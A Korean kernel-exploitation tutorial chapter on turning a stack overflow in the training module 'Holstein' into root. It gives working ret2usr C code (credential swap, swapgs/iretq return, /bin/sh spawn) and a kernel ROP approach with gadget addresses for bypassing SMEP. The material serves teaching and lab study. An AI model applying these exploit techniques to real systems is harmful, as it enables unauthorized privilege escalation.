---
title: "Holstein v1: Stack Overflow 악용"
tags:
    - [Linux]
    - [Kernel]
    - [Stack Overflow]
    - [ret2user, ret2usr]
    - [kROP]
    - [SMAP]
    - [SMEP]
    - [KPTI]
    - [KASLR]
lang: kr
permalink: /kr/linux-kernel/LK01/stack_overflow.html
pagination: true
bk: welcome-to-holstein.html
fd: heap_overflow.html
---
지난 절에서는 Holstein 모듈에서 Stack Overflow를 발견하고, 그 취약점으로 RIP를 제어할 수 있음을 확인했습니다. 이번 절에서는 그 primitive를 실제 LPE로 연결하는 방법과, 여러 커널 보안 기법을 우회하는 방법을 다룹니다.

## 권한 상승 방법
권한 상승 방법은 여러 가지가 있지만, 가장 기본적인 방식은 `commit_creds`를 이용하는 것입니다. 이것은 커널이 root 권한 프로세스를 만들 때 수행하는 작업과 사실상 같은 처리를 직접 호출하는 방법이라 매우 자연스럽습니다.

그리고 root 권한을 얻은 뒤에 또 하나 중요한 것은 사용자 공간으로 안전하게 돌아오는 것입니다. 지금 우리는 커널 모듈을 exploit하고 있으므로 실행 컨텍스트는 커널에 있습니다. 최종적으로는 사용자 공간으로 복귀해 root 셸을 띄워야 하므로, 크래시 없이 돌아와야 합니다.

먼저 이 두 부분의 이론을 정리해 봅시다.

### `prepare_kernel_cred`와 `commit_creds`
모든 프로세스에는 권한 정보가 할당됩니다. Linux에서는 이 정보가 힙에 존재하는 [`cred` 구조체](https://elixir.bootlin.com/linux/v5.14.9/source/include/linux/cred.h#L110)에 저장됩니다. 각 프로세스는 [`task_struct`](https://elixir.bootlin.com/linux/v5.14.9/source/include/linux/sched.h#L661)로 표현되며, 그 안에 `cred` 구조체를 가리키는 포인터가 들어 있습니다.
```c
struct task_struct {
    ...
	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
    ...
}
```
커널 exploit에서 특히 중요한 함수가 [`prepare_kernel_cred`](https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L719)입니다. 새로운 credential 구조체를 할당하고 초기화하는 함수입니다.
```c
/* 인자로 task_struct 포인터를 받는다 */
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
	if (!new)
		return NULL;

	kdebug("prepare_kernel_cred() alloc %p", new);

	if (daemon)
		old = get_task_cred(daemon);
	else
		old = get_cred(&init_cred);

    ...

    return new;
}
```
이제 `prepare_kernel_cred(NULL)`의 동작을 따라가 봅시다. 먼저 다음 코드로 새 credential 객체를 하나 할당합니다.
```c
new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
```
그리고 첫 번째 인자 `daemon`이 `NULL`이면 `init_cred`를 원본으로 사용합니다.
```c
old = get_cred(&init_cred);
```
이후에는 `old`를 검증하고, 적절한 멤버를 `new`로 복사합니다.

즉 `prepare_kernel_cred(NULL)`은 `init_cred`를 기반으로 한 credential 구조체를 만들어 줍니다. 그럼 [`init_cred`](https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L41) 정의를 봅시다.
```c
/*
 * The initial credentials for the initial task
 */
struct cred init_cred = {
	.usage			= ATOMIC_INIT(4),
#ifdef CONFIG_DEBUG_CREDENTIALS
	.subscribers		= ATOMIC_INIT(2),
	.magic			= CRED_MAGIC,
#endif
	.uid			= GLOBAL_ROOT_UID,
	.gid			= GLOBAL_ROOT_GID,
	.suid			= GLOBAL_ROOT_UID,
	.sgid			= GLOBAL_ROOT_GID,
	.euid			= GLOBAL_ROOT_UID,
	.egid			= GLOBAL_ROOT_GID,
	.fsuid			= GLOBAL_ROOT_UID,
	.fsgid			= GLOBAL_ROOT_GID,
	.securebits		= SECUREBITS_DEFAULT,
	.cap_inheritable	= CAP_EMPTY_SET,
	.cap_permitted		= CAP_FULL_SET,
	.cap_effective		= CAP_FULL_SET,
	.cap_bset		= CAP_FULL_SET,
	.user			= INIT_USER,
	.user_ns		= &init_user_ns,
	.group_info		= &init_groups,
	.ucounts		= &init_ucounts,
};
```
보면 알 수 있듯이 `init_cred`는 사실상 root 권한을 가진 credential입니다.

이제 root credential을 만들 수 있게 되었습니다. 다음은 이 credential을 현재 프로세스에 설치해야 합니다. 그 역할을 하는 것이 [`commit_creds`](https://elixir.bootlin.com/linux/v5.14.9/source/kernel/cred.c#L449)입니다.
```c
int commit_creds(struct cred *new)
```
따라서 커널 exploit에서 고전적인 권한 상승 primitive는 다음과 같습니다.
```c
commit_creds(prepare_kernel_cred(NULL));
```

**[2023년 3월 28일 추가]**  
Linux 6.2부터는 [`prepare_kernel_cred`에 `NULL`을 넘길 수 없게 되었습니다](https://elixir.bootlin.com/linux/v6.2/source/kernel/cred.c#L712). 하지만 `init_cred`는 여전히 존재하므로, `commit_creds(&init_cred)`를 실행하면 같은 효과를 얻을 수 있습니다.

### `swapgs`: 사용자 공간으로 복귀
`prepare_kernel_cred`와 `commit_creds`를 호출해 root 권한을 얻었다고 해서 끝은 아닙니다. ROP chain이 끝난 뒤에는 아무 일도 없었던 것처럼 사용자 공간으로 돌아가 셸을 띄워야 합니다. root를 얻어도 바로 크래시하면 exploit로서 의미가 없습니다.

ROP는 원래 저장돼 있던 스택 프레임을 덮어쓰고 그 자리에 chain을 놓는 방식이므로, "원래대로 돌아간다"는 것은 직관적으로 꽤 어려워 보입니다. 하지만 커널 exploit에서는 취약점을 터뜨리는 프로세스 자체가 우리가 작성한 프로그램이기 때문에, chain이 끝난 뒤 유효한 사용자 공간 스택 포인터와 RIP만 잘 준비해 두면 사용자 공간으로 돌아갈 수 있습니다.

원래 사용자 공간에서 커널 공간으로 넘어가는 방법은 `syscall`이나 인터럽트입니다. 반대로 커널에서 사용자 공간으로 돌아갈 때는 보통 `sysretq` 또는 `iretq`가 사용됩니다. `iretq`가 개념적으로 더 단순하기 때문에 kernel exploit에서는 주로 `iretq`를 씁니다. 또 사용자 모드로 돌아가기 전에 커널 GS를 사용자 GS로 바꿔야 하므로 `swapgs`가 필요합니다.

즉 실전에서는 `swapgs`와 `iretq`를 연속해서 실행하면 됩니다. 이때 `iretq`를 호출하기 직전 스택에는 다음과 같은 사용자 공간 복귀 정보가 쌓여 있어야 합니다.

<center>
  <img src="img/iretq.png" alt="iretq 호출 시 스택" style="width:340px;">
</center>

사용자 공간의 `RSP`, `RIP`뿐 아니라 `CS`, `SS`, `RFLAGS`도 원래 값으로 되돌려야 합니다. `RSP`는 유효한 사용자 공간 주소면 되고, `RIP`는 셸을 띄우는 함수로 두면 됩니다. 나머지 레지스터 값은 사용자 공간에 있을 때 값을 미리 저장해 두면 됩니다.
```c
static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}
```
`main` 초반 같은 사용자 공간 코드에서 이 함수를 호출해 두고, 나중에 `iretq` 직전에 이 값을 사용하면 됩니다.

## ret2user (ret2usr)
이제 위 이론을 실제 exploit로 옮겨 보겠습니다.

가장 기본적인 기법은 ret2user입니다. 이 시점에서는 SMEP가 꺼져 있으므로 커널이 사용자 공간 메모리에 놓인 코드를 그대로 실행할 수 있습니다. 따라서 지금까지 설명한 `prepare_kernel_cred`, `commit_creds`, `swapgs`, `iretq` 흐름을 그냥 C 코드로 작성해 두면 됩니다.
```c
static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

static void restore_state() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs), "r"(win));
}

static void escalate_privilege() {
  char* (*pkc)(int) = (void*)(prepare_kernel_cred);
  void (*cc)(char*) = (void*)(commit_creds);
  (*cc)((*pkc)(0));
  restore_state();
}
```
이 helper들은 단순한 Kernel Exploit에서 매우 자주 쓰이므로, 각자 자신만의 템플릿으로 정리해 두는 것이 좋습니다. 또한 취약점 트리거 전에 `save_state()`도 호출해 두세요.

`escalate_privilege` 안에서는 `prepare_kernel_cred`와 `commit_creds`의 주소가 필요합니다. 이번에는 KASLR이 비활성화되어 있으므로 주소는 고정입니다. 실제 주소를 구해 exploit 코드에 써 넣으면 됩니다.

<center>
  <img src="img/check_kallsyms.png" alt="/proc/kallsyms에서 주소 확인" style="width:380px;">
</center>

이제 취약점을 사용해 `escalate_privilege`로 흐름만 넘겨 주면 됩니다. 대충 이 함수 포인터를 많이 덮어써도 되지만, 나중에 ROP도 할 예정이므로 정확한 RIP 오프셋을 알아 두는 편이 좋습니다. 정적으로 IDA에서 구해도 되지만, 여기서는 gdb로 직접 확인해 봅시다.

`module_write`에서 `_copy_from_user`를 호출하는 위치를 보면 모듈 기준 오프셋은 `0x190`입니다. `/proc/modules`에서 얻은 모듈 베이스를 더해 브레이크포인트를 걸고 write를 호출해 보면, `RDI + 0x400` 근처는 다음과 같습니다.

<center>
  <img src="img/gdb_debug_copy.png" alt="_copy_from_user 시점의 목적지 버퍼" style="width:580px;">
</center>

그리고 함수가 리턴되기 직전까지 진행하면:

<center>
  <img src="img/gdb_debug_ret.png" alt="module_write 종료 직전" style="width:580px;">
</center>

이 시점에서 `RSP`는 `0xffffc90000413eb0`을 가리킵니다.

<center>
  <img src="img/gdb_debug_ret_regs.png" alt="module_write 종료 직전 레지스터" style="width:480px;">
</center>

즉 `0x408`바이트를 채운 뒤부터 RIP를 제어할 수 있어 보입니다. 그러면 exploit를 다음처럼 바꿀 수 있습니다.
```c
  char buf[0x410];
  memset(buf, 'A', 0x410);
  *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
  write(fd, buf, 0x410);
```
최종 exploit는 [여기](exploit/ret2usr.c)에 있습니다.

`module_write` 마지막 `ret` 직전에 멈춰 보면 실제로 `escalate_privilege`에 도달하는 것을 확인할 수 있습니다.

<center>
  <img src="img/gdb_escalate_privilege.png" alt="RIP 제어로 escalate_privilege 호출" style="width:520px;">
</center>

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="늑대" ></div>
  <p class="says">
    `nexti`를 쳤는데 다음 명령에서 안 멈추는 경우가 있어.<br>
    그럴 때는 `stepi`를 써 보거나, 조금 앞에 브레이크포인트를 거는 편이 좋아.
  </p>
</div>

exploit가 올바르게 작성되었다면 `prepare_kernel_cred`와 `commit_creds`를 통과합니다. `restore_state` 내부도 step-in으로 확인해 보세요. `iretq` 직전 스택은 다음과 같아야 합니다.

<center>
  <img src="img/gdb_rsp_before_iretq.png" alt="iretq 직전 스택 상태" style="width:580px;">
</center>

`stepi`로 진행했을 때 `win` 함수에 들어가면 성공입니다.

<center>
  <img src="img/ret2usr_win.png" alt="win 함수 호출 성공" style="width:320px;">
</center>

지금은 원래부터 root일 수 있어서 실제 권한 상승 여부가 티가 안 날 수 있습니다. 그래도 사용자 공간으로 정상 복귀한 것은 확인되었습니다. 이제 `S99pawnyable` 설정을 원래대로 되돌리고, 일반 사용자 권한에서 exploit를 실행해 봅시다.

<center>
  <img src="img/ret2usr_lpe.png" alt="ret2usr에 의한 LPE" style="width:400px;">
</center>

권한 상승에 성공했습니다.
처음 접하는 개념이 많아 조금 어렵게 느껴질 수 있지만, 이후 힙 취약점이나 경쟁 상태 취약점을 계속 다루다 보면 마지막 권한 상승 단계는 상당히 비슷하다는 것을 느끼게 될 것입니다.

## kROP
이제 SMEP를 켜 봅시다. QEMU 실행 시 CPU 옵션에 `smep`를 추가합니다.
```
-cpu kvm64,+smep
```
이 상태에서 방금 ret2user exploit를 다시 실행해 봅시다.

<center>
  <img src="img/smep_crash.png" alt="SMEP를 켜면 크래시" style="width:640px;">
</center>

크래시합니다. 메시지에 `unable to execute userspace code (SMEP?)`라고 나오므로, 이제 SMEP 때문에 사용자 공간 코드를 커널에서 실행할 수 없다는 뜻입니다.

이 상황은 사용자 공간의 NX(DEP)와 매우 비슷합니다. 사용자 공간 메모리는 읽고 쓸 수 있지만 실행은 못 하게 된 것입니다. 따라서 NX를 ROP로 우회하듯이 SMEP도 ROP로 우회할 수 있습니다. 커널 공간에서의 ROP를 보통 kROP라고 부릅니다.

사용자 공간 exploitation에 익숙하다면, ret2user에서 했던 흐름을 ROP chain으로 바꾸는 것 자체는 어렵지 않을 것입니다. ROP chain 작성 방법 자체에 특별한 점은 많지 않으니, 여기서는 gadget를 찾는 부분만 같이 봅시다.

먼저 Linux 커널에서 ROP gadget를 찾으려면 `bzImage`에서 핵심 ELF 이미지인 `vmlinux`를 뽑아야 합니다. 이를 위해 공식 [extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) 스크립트를 사용할 수 있습니다.
```
$ extract-vmlinux bzImage > vmlinux
```
그다음 원하는 gadget finder를 사용하면 됩니다.
```
$ ropr vmlinux --noisy --nosys --nojop -R '^pop rdi.+ret;'
...
0xffffffff8127bbdc: pop rdi; ret;
...
```
출력된 주소는 절대 주소입니다. 이는 KASLR이 꺼졌을 때 커널 베이스 주소(`0xffffffff81000000`)에 상대 오프셋을 더한 값입니다. 위 예시라면 상대 오프셋은 `0x27bbdc`입니다. 지금은 KASLR이 비활성화되어 있으니 그대로 사용해도 되지만, KASLR이 켜져 있는 환경에서는 반드시 상대 오프셋 기준으로 계산해야 합니다.

Linux 커널은 libc보다 훨씬 방대한 코드 양을 갖고 있으므로, 실제로는 원하는 동작을 구성할 만큼의 ROP gadget가 있는 경우가 많습니다. 이번 예제에서는 다음 gadget들을 사용합니다.
```
0xffffffff8127bbdc: pop rdi; ret;
0xffffffff81c9480d: pop rcx; ret;
0xffffffff8160c96b: mov rdi, rax; rep movsq [rdi], [rsi]; ret;
0xffffffff8160bf7e: swapgs; ret;
```
마지막으로 `iretq`도 필요하지만, 일반적인 gadget 검색 도구는 이것을 잘 찾아주지 않으므로 `objdump` 같은 도구로 직접 찾아야 합니다.
```
$ objdump -S -M intel vmlinux | grep iretq
ffffffff810202af:       48 cf                   iretq
...
```

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="늑대" ></div>
  <p class="says">
    대부분의 ROP gadget 도구는 커널처럼 거대한 바이너리에 대해 충분히 검증되지 않았어.<br>
    지원하지 않는 명령을 건너뛰거나 prefix를 빠뜨리는 등 잘못된 결과를 내는 경우가 많아.<br>
    또 gadget가 실제 실행 가능한 커널 메모리에 있는지 제대로 판별하지 못하는 도구도 많으니, <code>0xffffffff81cXXXYYY</code> 같은 높은 주소는 특히 조심해야 해.
  </p>
</div>

ROP chain 작성 방식은 자유지만, 저자는 gadget를 추가하거나 제거해도 오프셋을 다시 계산할 필요가 적어서 다음 방식처럼 쓰는 것을 선호합니다.
```c
unsigned long *chain = (unsigned long*)&buf[0x408];
*chain++ = rop_pop_rdi;
*chain++ = 0;
```

이후 흐름은 같습니다.
- `prepare_kernel_cred(0)` 호출
- 반환된 포인터를 `rdi`로 옮김
- `commit_creds` 호출
- `swapgs` 실행
- `iretq`로 사용자 공간 복귀

이 버전에 익숙해지면 다음 장으로 넘어가세요. 다음부터는 스택 오버플로 대신 힙 기반 취약점이 중심이 됩니다.
